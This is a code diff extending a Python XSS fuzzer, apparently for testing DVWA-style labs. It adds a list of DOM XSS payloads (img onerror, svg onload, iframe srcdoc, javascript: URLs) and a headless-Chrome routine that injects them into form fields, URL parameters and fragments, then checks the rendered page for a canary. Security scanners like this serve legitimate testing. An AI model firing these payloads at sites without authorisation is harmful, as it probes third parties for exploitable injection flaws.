@@ -1,9 +1,14 @@
 import requests
 import re
+import random
+import time
 from urllib.parse import urljoin, urlparse, quote
 from uuid import uuid4
 from html import escape
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from auth import seleniumLogin
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
 
 # Regex templates for XSS injections
 SCRIPT_RE = r"<script[^>]*>.*?<!--\s*({token})\s*-->.*?</script>"
@@ -19,6 +24,23 @@ SQL = [
     "mysql_fetch", "mysqli_", "pg_query", "syntax error at or near",
     "unclosed quotation mark after the character string", "ora-"
 ]
+
+dom_payloads = [
+        "<img src=x onerror=alert(1)>",
+        "\"><img src=x onerror=alert(1)>",
+        "'\"><img src=x onerror=alert(1)>",
+        "<video src=x onerror=alert(1)>",
+        "<audio src=x onerror=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "\"><svg/onload=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "</script><script>alert(1)</script>",
+        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
+        "<body onload=alert(1)>",
+        "javascript:alert(1)",
+        "<img src=1 onerror=alert`1`>",
+        "<img src=x onerror=confirm(1)>",
+    ]
 
 def canary(payload, token):
     """
@@ -83,7 +105,7 @@ def isFuzzableField(field):
     skips = [
         "user_token", "security", "login", "upload", "change", "submit",
         "max_file_size", "step", "create_db", "password",
-        "btnclear", "btnsign", "default",'rememberme',"captcha"
+        "btnclear", "btnsign","rememberme","captcha", "default"
     ]
 
     return not any(skip in lowered for skip in skips)
@@ -92,14 +114,15 @@ def isFuzzableField(field):
 
 class XSSFuzzer:
 
-    def __init__(self, baseUrl, useCrawler = False, outputToFile= False, wordlistPath=None,isDVWA= False, isSilent=False):
+    def __init__(self, baseUrl, useCrawler = False, outputToFile= False, wordlistPath=None,isDVWA= False, isSilent=False, headless= True):
         self.baseUrl = baseUrl
         self.useCrawler = useCrawler
         self.wordlistPath = wordlistPath
         self.outputToFile = outputToFile
-        self.payloads = self.loadWordlist()
+        self.payloads = self.loadWordlist() if self.wordlistPath is not None else []
         self.isSilent = isSilent
         self.token = f"XSSCanary-{uuid4().hex[:8]}"
+        self.headless = headless
 
         self.isDVWA = isDVWA
         self.session = requests.Session()
@@ -457,11 +480,110 @@ class XSSFuzzer:
         return results
 
 
-    def domXSS(self):
+    def domXSS(self, forms= None, endpoints= None):
         """
             Submits payload via query then loads and checks JS for payload
         """
-        pass
+        results =[]
+
+        parsedBase = urlparse(self.baseUrl)
+        base = f"{parsedBase.scheme}://{parsedBase.netloc}"
+
+        candidates = []
+
+        if forms:
+            for form in forms:
+
+                url = form.get("url")
+                method = (form.get("method") or "GET").upper()
+                fields = form.get("formFields") or[]
+
+                if not url or method != "GET" or not fields:
+                    continue
+
+                if not url.startswith("http"):
+                    url = f"{base}{url}"
+
+                for raw in dom_payloads:
+                    marked = canary(raw, self.token)
+                    parts = []
+
+                    for field in fields:
+                        parts.append(f"{field}={quote(marked, safe='')}")
+
+                    seperator = "&" if "?" in url else "?"
+                    candidates.append((f"{url}{seperator}{'&'.join(parts)}", raw, marked))
+                    candidates.append((f"{url}#{quote(marked, safe='')}", raw, marked))
+
+        if endpoints:
+            for ep in endpoints:
+                rawUrl = ep.get("url")
+                params = ep.get("params") or []
+
+                if not rawUrl or not params:
+                    continue
+
+                fullUrl = rawUrl if rawUrl.startswith("http") else f"{base}{rawUrl}"
+                chosenPayloads = dom_payloads if len(dom_payloads) <= 4 else random.sample(dom_payloads, 4)
+
+                for raw in chosenPayloads:
+                    marked = canary(raw,self.token)
+                    parts = [f"{p}={quote(marked,safe='')}" for p in params]
+                    seperator = "&" if "?" in fullUrl else "?"
+                    candidates.append((f"{fullUrl}{seperator}{'&'.join(parts)}", raw, marked))
+                    candidates.append((f"{fullUrl}#{quote(marked, safe='')}", raw, marked))
+
+        if not candidates:
+            return results
+
+        options = Options()
+        if self.headless:
+            options.headless = True
+            options.add_argument("--headless=new")
+        options.add_argument("--window-size=1920,1080")
+
+        # TO silence console
+        options.add_argument("--log-level=3")
+        options.add_experimental_option("excludeSwitches", ["enable-logging"])
+
+        driver = webdriver.Chrome(options=options)
+        try:
+            baseUrl = f"{urlparse(self.baseUrl).scheme}://{urlparse(self.baseUrl).netloc}"
+
+            if self.isDVWA:
+                loggedIn = seleniumLogin(driver, baseUrl)
+                if not loggedIn:
+                    print("[!] Selenium login failed. Aborting domXSS fuzzing.")
+                    driver.quit()
+                    return results
+
+            seen = set()
+            for finUrl, raw, marked in candidates:
+                pageKey = finUrl.split("?", 1)[0].split("#", 1)[0]
+
+                if pageKey in seen:
+                    continue
+
+                try:
+                    driver.get(finUrl)
+                    time.sleep(0.25)
+                    body = driver.page_source or ""
+
+                    if self.token.lower() in body.lower() and detectXSS(body, self.token, marked):
+                        results.append({
+                            "url": finUrl,
+                            "payload": raw,
+                            "status_code": 200,
+                            "snippet": body[:200]
+                        })
+                        seen.add(pageKey)
+
+                except Exception:
+                    continue
+        finally:
+            driver.quit()
+
+        return results
 
     def login(self):
         """
